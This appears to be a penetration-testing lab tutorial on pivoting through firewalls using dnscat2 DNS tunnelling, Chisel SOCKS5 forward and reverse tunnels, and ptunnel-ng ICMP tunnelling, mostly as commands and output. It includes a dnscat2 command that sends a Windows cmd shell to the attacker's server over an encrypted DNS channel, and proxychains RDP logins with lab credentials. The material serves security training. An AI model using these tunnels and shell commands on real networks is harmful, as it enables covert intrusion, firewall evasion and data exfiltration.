## DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between 2 hosts. It uses an encrypted C2 channel and sends data inside TXT records. Usually any AD domain environments have their own DNS server, with Dnscat2 the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be extremely useful to evade firewalls. We can execute a server on our attack host and a client on a Windows machine.

### Setting Up & Using Dnscat2

#### Cloning Dnscat2 and Setting Up the Server
```shell-session
$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### Starting the Dnscat2 Server
```shell-session
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

After running the server we will get a server key, which we will need to use with the client on the Windows machine, so it can authenticate and encrypt the data. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell). We can clone the project containing the client and transfer it to the target.

#### Cloning dnscat2-powershell to the Attack Host
```shell-session
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

#### Importing dnscat2.ps1
```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

We can now establish a tunnel with the server running, we can send back a CMD shell session to our server.

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

#### Confirming Session Establishment
```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

#### Listing dnscat2 Options
```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

We can use dnscat2 to interact with sessions and move further in a target environment on engagements.

#### Interacting with the Established Session
```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. We can start a Chisel server for an internal network we are not directly connected to.

### Setting Up & Using Chisel

#### Cloning Chisel
```shell-session
$ git clone https://github.com/jpillora/chisel.git
```

We will need to install go on our system

#### Building the Chisel Binary
```shell-session
$ cd chisel
go build
```

We need to be mindful of the size of the files we transfer onto targets, both for performance and detection reasons.

#### Transferring Chisel Binary to Pivot Host
```shell-session
$ scp chisel ubuntu@10.129.202.64:~/
```

#### Running the Chisel Server on the Pivot Host
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

The chisel listener will listen on incoming connections on port 1234 using SOCKS5 and forward it to all networks that are accessible from the pivot host.

#### Connecting to the Client Server
```shell-session
$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

The client created a TCP/UDP tunnel vie HTTP secured using SSH between the Chisel server and the client, and started listening on port 1080.

#### Editing & confirming proxychains.conf
```shell-session
$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

#### Pivoting to the Internal Host
```shell-session
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel Reverse Pivot

In some cases the firewall rules might restrict inbound connections to the compromised target. In such cases we can use Chisel with the reverse option.

The server will listen and accept connections, and they will be proxied through the client, which specified the remote.

#### Starting the Chisel Server on our Attack Host
```shell-session
$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### Connecting the Chisel Client to our Attack Host
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

#### Editing & Confirming proxychains.conf
```shell-session
$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

#### Connecting with RDP
```shell-session
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Note:** If you are getting an error message with chisel on the target, try with a different version.

## ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses, it will only work when ping responses are permitted within a firewalled network.

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. We will then be able to proxy our traffic through the ptunnel-ng client.

### Setting Up & Using ptunnel-ng

#### Cloning ptunnel-ng
```shell-session
$ git clone https://github.com/utoni/ptunnel-ng.git
```

#### Building ptunnel-ng with autogen.sh
```shell-session
$ sudo ./autogen.sh 
```

#### Transferring ptunnel-ng to the Pivot Host
```shell-session
$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

#### Starting the ptunnel-ng Server on the Target Host
```shell-session
$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

The IP address following the `-r` should be the IP address we want ptunnel-ng to accept connection on.

We will now need to connect to the server from the attack host, with local port 2222 which allows us to send packets through the ICMP tunnel.

#### Connecting to the ptunnel-ng Server from Attack Host
```shell-session
$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

#### Tunneling an SSH Connection Through an ICMP Tunnel
```shell-session
$ ssh -p2222 -lubuntu 127.0.0.1
```

We will see session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel.

#### Viewing Tunnel Traffic Statistics
```shell-session
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

We can also use this tunnel and SSH for dynamic port forwarding.

#### Proxychains Through the ICMP Tunnel
```shell-session
$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```

